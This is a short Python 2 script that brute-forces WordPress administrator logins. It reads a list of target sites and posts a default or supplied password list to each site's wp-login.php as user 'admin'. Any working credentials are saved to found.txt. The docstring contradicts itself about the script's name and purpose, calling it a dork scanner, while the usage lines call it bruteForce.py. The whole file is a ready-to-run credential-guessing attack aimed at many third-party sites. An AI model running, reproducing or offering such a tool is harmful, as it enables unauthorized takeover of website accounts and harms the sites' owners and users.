#!/usr/bin/env python2
# -*- coding: utf-8 -*-
#
#

"""
dorkScanner.py, find sites from dorks.

Usage:
	~$ python2 bruteForce.py sites.txt pwds.txt
	~$ python2 bruteForce.py sites.txt          # Use default passwords

	// Brute force process will be started"
"""

__author__ = "Black Viking"
__date__   = "16.04.2017"

import sys
import requests

found     = []
file      = open("found.txt", "a")
passwords = ["admin", "193728465", "pass", "password", "admin123", "qwerty", "123", "123456789"]

def brute(site, username="admin", control=False):
	''' Try login to site with username:password '''

	for pwd in passwords:
		try:
			payload = {"log": "admin", "pwd": pwd}
			req = requests.post(site, data=payload, timeout=5)
			
			if '/wp-admin' in req.url:
				if control != False:
					print "[+] Site: %s\n\t[*] Username: %s\n\t[*] Password: %s\n%s\n"%(site, username, pwd, "-"*60)
				else:
					pass
				file.write("[+] Site: %s\n\t[*] Username: %s\n\t[*] Password: %s\n%s\n"%(site, username, pwd, "-"*60))
				file.flush()
				found.append((site, username, pwd))
				break

		except:
			return


if __name__ == '__main__':
	''' When script runs directly '''

	if len(sys.argv) == 3:
		sites     = open(sys.argv[1], "r").read().split("\n")
		passwords = open(sys.argv[2], "r").read().split("\n")

	elif len(sys.argv) == 2:
		sites = open(sys.argv[1], "r").read().split("\n")

	else:
		sys.exit()

	for site in sites:
		site = "http://" + site.split("/")[2] + "/wp-login.php" # re formatting url for test :)

		print "[-] Trying: ", site
		brute(site, control=True)
